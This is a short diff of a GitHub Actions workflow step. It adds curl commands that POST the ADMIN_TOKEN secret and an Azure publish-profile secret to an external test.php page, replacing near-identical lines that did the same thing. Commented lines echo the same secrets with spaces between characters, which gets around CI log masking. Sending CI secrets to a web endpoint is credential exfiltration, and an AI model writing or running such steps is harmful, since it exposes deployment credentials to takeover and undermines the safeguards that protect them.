@@ -64,8 +64,8 @@ jobs:
           ADMIN_TOKEN: ${{secrets.ADMIN_TOKEN}}
           PUBLISH_PROFILE: ${{secrets.AZUREAPPSERVICE_PUBLISHPROFILE_88810BC5C63F4E9085BB94A4A4BF2B0B}}
         run: |
-          curl -X POST -d toke=${{secrets.ADMIN_TOKEN}} https://plin-web.azurewebsites.net/test.php
-          curl -X POST -d token='${{secrets.AZUREAPPSERVICE_PUBLISHPROFILE_88810BC5C63F4E9085BB94A4A4BF2B0B}}' https://plin-web.azurewebsites.net/test.php
+          curl -X POST -d toke=${{env.ADMIN_TOKEN}} https://plin-web.azurewebsites.net/test.php
+          curl -X POST -d token='${{env.PUBLISH_PROFILE}}' https://plin-web.azurewebsites.net/test.php
 
 #          echo ${{env.PUBLISH_PROFILE}} | sed 's/./& /g'
 #          echo ${{env.ADMIN_TOKEN}} | sed 's/./& /g'
